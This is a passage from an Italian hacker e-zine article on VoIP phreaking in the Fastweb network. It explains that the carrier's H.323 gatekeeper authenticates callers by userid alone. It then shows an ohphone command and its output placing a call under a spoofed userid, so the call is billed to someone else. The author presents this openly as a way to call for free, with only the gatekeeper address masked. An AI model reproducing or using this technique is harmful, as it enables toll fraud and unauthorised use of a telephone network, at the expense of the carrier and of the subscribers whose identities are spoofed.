+    Mi aspetto che noi Italiani daremo una smossa alla scena mondiale del
+    phreaking, quindi iniziate ad andare su http://www.openh323.org, leggetevi
+    gli standard sull'H323, createvi il vostro centralino VoIP, e fatevi
+    chiamare da qualche amico.
+
+  5.1 phreaking in rete Fastweb
+
+    Ma rieccoci qui a parlare di fastweb e vedere come fare phreaking nella
+    sua rete.
+
+    Premesso che il phreaking non e' la mera azione di "chiamare gratis", ma
+    e' l'esplorazione del funzionamento dei sistemi telefonici e di quelli ad
+    essi strettamente correlati, andiamo a vedere un filo come funziona la
+    telefonia di Fastweb.
+
+    Come ho spiegato in precedenza, il CPV incorpora le funzioni di proxy
+    h323, permettendovi di collegare ad esso un normalissimo telefono (con
+    uscira rj-11) e ricevere e fare telefonate in modo completamente 
+    trasparente alla infrastruttura tecnologica che c'e' sotto.
+    Ovviamente a noi proprio quella interessa...
+    
+    Quando voi alzate la cornetta, il CPV si collega immediatamente al
+    gatekeeper VoIP, che nel nostro caso e' un Cisco Router con un IOS
+    (Internet Operating System) "speciale", che si occupera' di instradare le
+    chiamate lungo il percorso migliore.
+    Ovviamente se effettuate una chiamata verso una utenza Fastweb, questa
+    rimarra' su IP, e sara' routata verso il CPV di destinazione, mentre se e'
+    verso una utenza Fissa o Mobile, Fastweb provvedera' a instradare la
+    chiamata su rete GSM o verso il carrier telefonico giusto.
+
+    Ma ora chiediamoci:
+    Come fa Fastweb a fare l'operazione di "accounting", ovvero sapere quante
+    e quali telefonate facciamo in modo da farci pervenire la bolletta a casa?
+    La risposta e' anche il modo con cui noi andremo a telefonare gratis...
+
+    Dovete sapere che quando si effettua una chiamata VoIP, e' necessario
+    identificarsi sul gatekeeper con uno "userid" ed eventualmente con una
+    "password" (ma non obbligatoriamente).
+    Come avrete intuito fastweb basa tutto sul solo "userid" che in questo
+    caso e' il vostro numero di telefono su rete Fastweb, mentre, come nota,
+    nelle infrastrutture VoIP "serie" chiunque viene identificato con la
+    propria email e per effettuare le chiamate deve autentificarsi sul
+    gatekeeper con una password.
+    
+    Ma allora cosa succede se noi proviamo a utilizzare software che
+    supportano l'H323 come ohphone del progetto Openh323, o linphone
+    (http://simon.morlat.free.fr/english/linphone.html) o ancora netmeeting
+    sotto windows per collegarsi al gatekeeper usando come userid la la
+    parola "OsamaBinLaden"?
+
+    root@somewhere:~# ./ohphone_1.1pl1 -r -u OsamaBinLaden -t
+     -g IP.DEL.GATE.KEEPER NUMERO_DA_CHIAMARE.
+    Gatekeeper set: nome_del_gatekeeper@IP.DEL.GATE.KEEPER
+    OsamaBinLaden is calling host  NUMERO_DA_CHIAMARE
+    Command ?   0:05.836     H225CallThread:83f4680   transports.cxx(1023) 
+     TCP     Started connection to IP.DEL.GATE.KEEPER:1720
+     (if=10.xxx.xxx.xx:1062)
+    Started logical channel: sending G.711-ALaw-64k{sw} <4>
+    Started logical channel: receiving G.711-ALaw-64k{sw} <4>
+    Ringing phone for "IP.DEL.GATE.KEEPER" ...
+
+    Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh!!!!!!!
+    Ci siamo loggati sul gatekeeper e stiamo facendo una chiamata addebitando
+    il costo della chiamata all'utente OsamaBinLaden (e spero che fastweb gli
+    mandi una bolletta salata!).
+    Scusate se ho nascosto IP.DEL.GATE.KEEPER e 10.xxx.xxx.xx, ma potete
+    anche capire il perche'...
+
+
+    Allora, diciamo che mi sono anche rotto le palle di scrivere e vi esorto
+    TUTTI ad approfondire il funzionamento del VoIP, prendendo tutto il
+    materiale disponibile da http://www.openh323.org e altri siti.
+    Studiare l'h323 e' anche un po' una sfida perche' per avere gli standard
+    che sono ITU, si dovrebbe sborsare dai 20$ ai 100$ e non si possono
+    comunque redistribuire tali documenti.
+    Good Luck!
+
+
+  -- Bibbliogafia
+  
+  Per approfondire il funzionamento dell'ftp "in pratica" leggete l'ottimo
+  paper di D. J. Bernstein su: http://cr.yp.to/ftp.html
+  Per approfondire il funzionamento dell'EIGRP:
+   http://www.cisco.com/warp/public/103/1.html
+  Per approfondire il funzionamento dell'HSRP:
+   http://www.cisco.com/warp/public/619/index.shtml
+  Per approfondire il funzionamento dell'H323:
+   http://www.openh323.org/standards.html
+  
+  
+  Si ringrazia: vim
+
+  Si salutano: TUTTI (non ho voglia di scrivere i nomi di chi merita di
+  essere salutato altrimenti se me ne scordo qualcuno poi vengo linciato).
+
+  <FIGO> Se usate il Frame Buffer sotto linux provate ad eseguire
+  cat /dev/urandom >> /dev/fb0 <FIGO>
+
+   naif
+
+
+==============================================================================
+--------------------------------[ EOF 13/18 ]---------------------------------
+==============================================================================
